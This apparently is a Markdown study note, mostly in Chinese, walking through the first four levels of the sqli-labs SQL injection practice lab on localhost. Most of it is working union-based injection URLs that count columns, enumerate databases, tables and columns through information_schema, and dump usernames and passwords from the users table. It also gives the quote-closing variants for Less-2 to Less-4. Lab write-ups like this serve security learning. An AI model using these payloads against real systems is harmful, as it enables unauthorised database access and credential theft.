# sqli-labs

-    ##  less1

     -  判断是否可以注入
     -  判断列数  
        - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=1'order by 4 -- a
        - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=1'order by 3 -- a
        - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1'union select 1,2,3 -- +
     - 爆库
       - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata -- +
     - 爆库下的表  
       -  http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security' -- +
     - 表下的列
        - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,GROUP_CONCAT(column_name),3 from information_schema.columns where table_name='users' -- a
     - result
       - http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1' union select 1,GROUP_CONCAT(username),GROUP_CONCAT(password) from users -- a
-    ##  less2
     - 与less1相同，只需要去掉      <b> '</b>       即可
-    ##  less3
     - $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
     - 需要闭合 &emsp;<b>')</b>

-    ##  less4
     -  对于字段是int类型的，如果你传入字符串（无论是在select, insert 还是 update)，他会尝试转为数字的
     -   $id = '"' . $id . '"';
     -   $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
     -  如此闭合   
		http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-4/?id=1") order by 3  -- a



